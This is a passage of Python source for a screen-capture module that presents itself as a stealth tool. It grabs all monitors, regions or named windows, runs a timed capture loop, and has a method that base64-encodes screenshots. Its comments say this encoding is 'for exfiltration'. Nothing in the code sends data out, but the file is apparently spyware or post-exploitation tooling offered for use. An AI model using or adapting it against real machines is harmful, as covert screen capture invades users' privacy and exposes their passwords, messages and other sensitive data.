- Stealth: captures without visible indicators
- Optional base64 encoding for exfiltration
- Window-specific capture by title (platform-dependent)
"""
import os
import sys
import time
import struct
import subprocess
import base64
import io
import platform
from datetime import datetime

# Detect available backends
BACKEND = None
try:
    import mss
    import mss.tools
    BACKEND = "mss"
except ImportError:
    try:
        from PIL import ImageGrab, Image
        BACKEND = "pillow"
    except ImportError:
        if platform.system() == "Linux":
            if subprocess.run(["which", "import"], capture_output=True).returncode == 0:
                BACKEND = "xwd"


class ScreenCapture:
    """Multi-backend screenshot capture engine."""

    def __init__(self, output_dir="/tmp", fmt="png", quality=85):
        self.output_dir = output_dir
        self.fmt = fmt.lower()
        self.quality = quality
        self.backend = BACKEND
        os.makedirs(output_dir, exist_ok=True)

    def _timestamp(self):
        return datetime.now().strftime("%Y%m%d_%H%M%S_%f")

    def capture_all(self):
        """Capture all monitors, return list of file paths."""
        paths = []
        if self.backend == "mss":
            with mss.mss() as sct:
                for i, monitor in enumerate(sct.monitors[1:], 1):
                    img = sct.grab(monitor)
                    path = os.path.join(self.output_dir, f"screen_{i}_{self._timestamp()}.{self.fmt}")
                    mss.tools.to_png(img.rgb, img.size, output=path)
                    paths.append(path)
        elif self.backend == "pillow":
            img = ImageGrab.grab(all_screens=True)
            path = os.path.join(self.output_dir, f"screen_all_{self._timestamp()}.{self.fmt}")
            img.save(path, quality=self.quality)
            paths.append(path)
        elif self.backend == "xwd":
            path = os.path.join(self.output_dir, f"screen_{self._timestamp()}.png")
            subprocess.run(["import", "-window", "root", path], capture_output=True, timeout=10)
            if os.path.exists(path):
                paths.append(path)
        return paths

    def capture_region(self, x, y, width, height):
        """Capture specific screen region."""
        if self.backend == "mss":
            with mss.mss() as sct:
                region = {"left": x, "top": y, "width": width, "height": height}
                img = sct.grab(region)
                path = os.path.join(self.output_dir, f"region_{self._timestamp()}.{self.fmt}")
                mss.tools.to_png(img.rgb, img.size, output=path)
                return path
        elif self.backend == "pillow":
            img = ImageGrab.grab(bbox=(x, y, x + width, y + height))
            path = os.path.join(self.output_dir, f"region_{self._timestamp()}.{self.fmt}")
            img.save(path, quality=self.quality)
            return path
        elif self.backend == "xwd":
            path = os.path.join(self.output_dir, f"region_{self._timestamp()}.png")
            subprocess.run([
                "import", "-window", "root",
                "-crop", f"{width}x{height}+{x}+{y}",
                path
            ], capture_output=True, timeout=10)
            return path if os.path.exists(path) else None

    def capture_to_bytes(self):
        """Capture primary monitor, return raw PNG bytes."""
        if self.backend == "mss":
            with mss.mss() as sct:
                img = sct.grab(sct.monitors[1])
                return mss.tools.to_png(img.rgb, img.size)
        elif self.backend == "pillow":
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return buf.getvalue()
        return None

    def capture_to_base64(self):
        """Capture and return base64-encoded PNG (for exfiltration)."""
        raw = self.capture_to_bytes()
        if raw:
            return base64.b64encode(raw).decode()
        return None

    def continuous_capture(self, interval=5.0, max_captures=100, callback=None):
        """Capture screenshots at interval. Optional callback(path) per capture."""
        captured = []
        for i in range(max_captures):
            try:
                paths = self.capture_all()
                captured.extend(paths)
                if callback:
                    for p in paths:
                        callback(p)
                time.sleep(interval)
            except KeyboardInterrupt:
                break
        return captured

    def capture_window_by_title(self, title_substring):
        """Capture specific window by partial title match (Linux X11 only)."""
        if platform.system() != "Linux":
            return None
        try:
            wlist = subprocess.check_output(["wmctrl", "-l"], text=True)
            window_id = None
            for line in wlist.strip().split("\n"):
                if title_substring.lower() in line.lower():
                    window_id = line.split()[0]
                    break
            if not window_id:
                return None
            path = os.path.join(self.output_dir, f"window_{self._timestamp()}.png")
            subprocess.run(["import", "-window", window_id, path], capture_output=True, timeout=10)
            return path if os.path.exists(path) else None
        except Exception:
            return None

    def get_monitor_info(self):
        """Return info about available monitors."""
        if self.backend == "mss":
            with mss.mss() as sct:
                return [{"id": i, "left": m["left"], "top": m["top"],
                         "width": m["width"], "height": m["height"]}
                        for i, m in enumerate(sct.monitors[1:], 1)]
        return [{"id": 1, "info": "monitor details unavailable with current backend"}]


def demo():
    """Demonstrate screenshot capture capabilities."""
    sc = ScreenCapture(output_dir="/tmp/screenshots")
    print(f"[*] Screenshot Capture Tool")
    print(f"    Backend: {sc.backend or 'NONE AVAILABLE'}")
    print(f"    Output: {sc.output_dir}")
    print(f"    Format: {sc.fmt}")
    print()
    monitors = sc.get_monitor_info()
    print(f"[*] Monitors detected: {len(monitors)}")
    for m in monitors:
        print(f"    Monitor {m.get('id', '?')}: {m.get('width', '?')}x{m.get('height', '?')}")
    print()
    print("[*] Capture modes:")
    print("    sc.capture_all()              — All monitors to files")
    print("    sc.capture_region(x,y,w,h)    — Specific region")
    print("    sc.capture_to_bytes()         — Primary monitor to bytes")
    print("    sc.capture_to_base64()        — Base64 for exfil")
    print("    sc.continuous_capture(5, 100) — Timed capture loop")


if __name__ == "__main__":
    demo()

